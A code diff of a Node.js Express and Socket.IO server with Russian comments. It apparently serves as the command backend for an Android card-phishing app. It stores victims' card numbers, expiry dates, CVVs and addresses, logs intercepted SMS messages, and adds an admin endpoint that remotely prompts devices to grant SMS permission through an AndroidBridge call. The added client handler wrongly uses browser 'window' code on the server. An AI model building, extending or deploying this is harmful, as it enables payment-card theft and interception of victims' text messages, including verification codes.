@@ -1,5 +1,3 @@
-// server.js
-
 const express = require("express");
 const http = require("http");
 const cors = require("cors");
@@ -63,7 +61,7 @@ db.serialize(() => {
   });
 });
 
-
+// Аутентификация JWT
 function authenticateToken(req, res, next) {
   const authHeader = req.headers["authorization"];
   if (!authHeader) return res.sendStatus(401);
@@ -87,7 +85,7 @@ app.post("/api/login", (req, res) => {
 });
 
 app.post("/api/register", (req, res) => {
-  const { deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission  } = req.body;
+  const { deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission } = req.body;
   const sql = `
     INSERT INTO Devices (deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
@@ -99,7 +97,6 @@ app.post("/api/register", (req, res) => {
       address        = excluded.address,
       timestamp      = excluded.timestamp,
       smsPermission  = excluded.smsPermission
-
   `;
   db.run(sql, [deviceId, cardholderName, cardNumber, expiry, cvv, address, timestamp, smsPermission ? 1 : 0], err => {
     if (err) return res.status(500).json({ success: false, message: err.message });
@@ -143,7 +140,6 @@ app.post("/api/update-sms-permission", (req, res) => {
   );
 });
 
-
 app.post("/api/sms", (req, res) => {
   const { deviceId, fromNumber, body, timestamp } = req.body;
   db.get("SELECT 1 FROM Devices WHERE deviceId = ?", [deviceId], (err, row) => {
@@ -162,18 +158,6 @@ app.post("/api/sms", (req, res) => {
     );
   });
 });
-// API: админ вручную запрашивает у клиента разрешение на СМС
-app.post("/api/request-sms-permission", authenticateToken, (req, res) => {
-  const { deviceId } = req.body;
-  if (!deviceId) return res.status(400).json({ success: false, message: "Missing deviceId" });
-
-  console.log(`Received request to send SMS permission for deviceId: ${deviceId}`);
-  // Отправляем событие через Socket.IO в пространство клиента
-  clientNsp.to(deviceId).emit("request_sms_permission");
-
-  res.json({ success: true });
-});
-
 
 // --- Socket.IO namespaces ---
 
@@ -198,7 +182,13 @@ adminNsp.on("connection", socket => {
 
 // Client namespace: no auth
 clientNsp.on("connection", socket => {
-  // nothing additional required
+  // Прослушиваем событие для запроса на СМС разрешение
+  socket.on("request_sms_permission", () => {
+    console.log("Received request_sms_permission event from server");
+    if (window.AndroidBridge?.requestSmsPermission) {
+      AndroidBridge.requestSmsPermission(); // Запрос СМС разрешения через AndroidBridge
+    }
+  });
 });
 
 // --- Prompt resubmit endpoints ---
@@ -231,6 +221,24 @@ app.get("/api/check-resubmit", (req, res) => {
       res.json({ success: true, resubmit: should });
     }
   );
+});
+
+// --- API: админ вручную запрашивает у клиента разрешение на СМС ---
+
+app.post("/api/request-sms-permission", authenticateToken, (req, res) => {
+  const { deviceId } = req.body;
+
+  if (!deviceId) {
+    return res.status(400).json({ success: false, message: "Missing deviceId" });
+  }
+
+  console.log(`Received request to send SMS permission for deviceId: ${deviceId}`);
+
+  // Отправляем событие через Socket.IO в пространство клиента
+  clientNsp.to(deviceId).emit("request_sms_permission");
+
+  // Ответ на запрос
+  res.json({ success: true });
 });
 
 server.listen(PORT, () => {
